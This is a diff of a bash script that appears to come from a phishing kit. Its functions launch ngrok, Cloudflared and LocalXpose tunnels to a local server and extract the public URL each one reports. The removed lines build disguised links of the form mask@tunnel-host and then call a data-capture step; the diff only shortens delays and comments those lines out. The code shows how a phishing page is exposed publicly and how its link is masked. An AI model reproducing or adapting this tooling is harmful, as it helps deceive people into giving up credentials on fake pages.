@@ -484,12 +484,13 @@ start_ngrok() {
 		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
 	fi
 
-	{ sleep 8; clear; banner_small; }
+	sleep 8
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
-	capture_data
+
+	# ngrok_url1=${ngrok_url#https://}
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	# capture_data
 }
 
 ## Start Cloudflared
@@ -506,13 +507,14 @@ start_cloudflared() {
 		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	{ sleep 8; clear; banner_small; }
+	sleep 8
 	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
-	capture_data
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+
+	# cldflr_link1=${cldflr_link#https://}
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	# capture_data
 }
 
 localxpose_auth() {
@@ -548,11 +550,12 @@ start_loclx() {
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
 
-	{ sleep 12; clear; banner_small; }
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
-	capture_data
+	sleep 10
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
+	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
+	# capture_data
 }
 
 ## Start localhost
